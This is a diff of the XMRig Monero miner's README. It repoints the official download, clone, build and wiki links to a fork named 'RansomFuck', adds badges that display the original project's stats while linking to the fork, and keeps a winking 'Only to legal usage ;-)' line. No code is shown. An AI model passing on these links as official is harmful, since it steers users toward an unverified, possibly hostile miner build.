@@ -1,3 +1,10 @@
+[![Github All Releases](https://img.shields.io/github/downloads/xmrig/xmrig/total.svg)](https://github.com/RansomFuck/xmrig/releases)
++[![GitHub release](https://img.shields.io/github/release/xmrig/xmrig.svg)](https://github.com/RansomFuck/xmrig/releases)
++[![GitHub Release Date](https://img.shields.io/github/release-date/xmrig/xmrig.svg)](https://github.com/RansomFuck/xmrig/releases)
++[![GitHub license](https://img.shields.io/github/license/xmrig/xmrig.svg)](https://github.com/RansomFuck/xmrig/blob/master/LICENSE)
++[![GitHub stars](https://img.shields.io/github/stars/xmrig/xmrig.svg)](https://github.com/RansomFuck/xmrig/stargazers)
++[![GitHub forks](https://img.shields.io/github/forks/RansomFuck/xmrig.svg)](https://github.com/RansomFuck/xmrig/network)
+
 # Donate to support this fucking project
 1CK5Jg3tXApiZ8YDaeRp9XEcmruaKVBLVT - bitcoin
 
@@ -17,8 +24,8 @@ Only to legal usage ;-)
 XMRig is a high performance Monero (XMR) CPU miner, with official support for Windows.
 Originally based on cpuminer-multi with heavy optimizations/rewrites and removing a lot of legacy code, since version 1.0.0 completely rewritten from scratch on C++.
 
-* This is the modified **CPU-mining** version, there is also a [NVIDIA GPU version](https://github.com/xmrig/xmrig-nvidia) and [AMD GPU version]( https://github.com/xmrig/xmrig-amd).
-* [Roadmap](https://github.com/xmrig/xmrig/issues/106) for next releases.
+* This is the modified **CPU-mining** version, there is also a [NVIDIA GPU version](https://github.com/RansomFuck/xmrig-nvidia) and [AMD GPU version]( https://github.com/RansomFuck/xmrig-amd).
+* [Roadmap](https://github.com/RansomFuck/xmrig/issues/106) for next releases.
 
 <img src="http://i.imgur.com/OKZRVDh.png" width="619" >
 
@@ -27,7 +34,7 @@ Originally based on cpuminer-multi with heavy optimizations/rewrites and removin
 * [Download](#download)
 * [Usage](#usage)
 * [Algorithm variations](#algorithm-variations)
-* [Build](https://github.com/xmrig/xmrig/wiki/Build)
+* [Build](https://github.com/RansomFuck/xmrig/wiki/Build)
 * [Common Issues](#common-issues)
 * [Other information](#other-information)
 * [Donations](#donations)
@@ -42,14 +49,14 @@ Originally based on cpuminer-multi with heavy optimizations/rewrites and removin
 * keepalived support.
 * Command line options compatible with cpuminer.
 * CryptoNight-Lite support for AEON.
-* Smart automatic [CPU configuration](https://github.com/xmrig/xmrig/wiki/Threads).
+* Smart automatic [CPU configuration](https://github.com/RansomFuck/xmrig/wiki/Threads).
 * Nicehash support
 * It's open source software.
 
 ## Download
-* Binary releases: https://github.com/xmrig/xmrig/releases
-* Git tree: https://github.com/xmrig/xmrig.git
-  * Clone with `git clone https://github.com/xmrig/xmrig.git` :hammer: [Build instructions](https://github.com/xmrig/xmrig/wiki/Build).
+* Binary releases: https://github.com/RansomFuck/xmrig/releases
+* Git tree: https://github.com/RansomFuck/xmrig.git
+  * Clone with `git clone https://github.com/RansomFuck/xmrig.git` :hammer: [Build instructions](https://github.com/RansomFuck/xmrig/wiki/Build).
 
 ## Usage
 ### Basic example
